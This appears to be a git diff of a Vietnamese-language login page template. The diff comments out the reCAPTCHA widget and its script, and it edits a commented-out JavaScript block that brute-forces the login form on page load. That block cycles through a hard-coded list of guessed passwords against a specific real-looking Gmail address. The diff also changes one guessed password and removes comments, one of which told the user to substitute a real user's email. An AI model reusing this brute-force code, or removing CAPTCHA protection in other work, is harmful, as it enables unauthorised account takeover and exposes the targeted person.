@@ -13,7 +13,7 @@
             <input type="password" name="password" class="form-control mb-3" id="inputPassword" placeholder="Nhập mật khẩu..." required>
           </div>
           
-          <div class="g-recaptcha" data-sitekey="6Lf6UOsnAAAAAH2AIShZdJNdYcgBkjxBQpH74Vb7"></div>
+          {{!-- <div class="g-recaptcha" data-sitekey="6Lf6UOsnAAAAAH2AIShZdJNdYcgBkjxBQpH74Vb7"></div>                                                        --}}
 
           <button type="submit" class="btn btn-primary">Đăng nhập</button>
         </form>
@@ -28,7 +28,7 @@
   </div>
 </div>
 
-<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+{{!-- <script src="https://www.google.com/recaptcha/api.js" async defer></script> --}}
 
 {{!-- <script>
 
@@ -46,7 +46,7 @@
 
 
 
-  const passwordGuesses = [ 'abcxys','hfduff', 'qwerty', 'letmein', 'Long@1234','Long@123'];
+  const passwordGuesses = [ 'abcxys','hfduff', 'qwerty', 'letmein', 'Long@1234','Long@12345'];
   const targetUrl = '/login/signin'; 
 
   async function performBruteForce() {
@@ -55,29 +55,29 @@
       const passwordInput = document.querySelector('input[name="password"]');
       const loginForm = document.getElementById('loginForm');
 
-      // Điền thông tin đăng nhập từ danh sách mật khẩu đoán
-      emailInput.value = 'nguyenlonglqmb@gmail.com'; // Thay thế bằng email của người dùng thật
+      
+      emailInput.value = 'nguyenlonglqmb@gmail.com'; 
       passwordInput.value = passwordGuess;
 
-      // Gửi yêu cầu POST đến URL đăng nhập
+      
       loginForm.submit();
 
-      // Đợi một khoảng thời gian để trang web xử lý yêu cầu
+      
       await new Promise(resolve => setTimeout(resolve, 5000));
 
-      // Xử lý chuyển hướng sau khi đăng nhập thành công
+      
       if (window.location.pathname === '/') {
         console.log(`Login successful with password: ${passwordGuess}`);
-        break; // Thoát vòng lặp nếu đăng nhập thành công
+        break; 
       }
 
-      // Xử lý chuyển hướng sau khi đăng nhập thất bại
+      
       if (window.location.pathname === '/login/signin') {
         console.log(`Login failed with password: ${passwordGuess}`);
       }
     }
   }
 
-  // Thực hiện tấn công khi trang web được tải
+  
   window.addEventListener('load', performBruteForce);
 </script> --}}
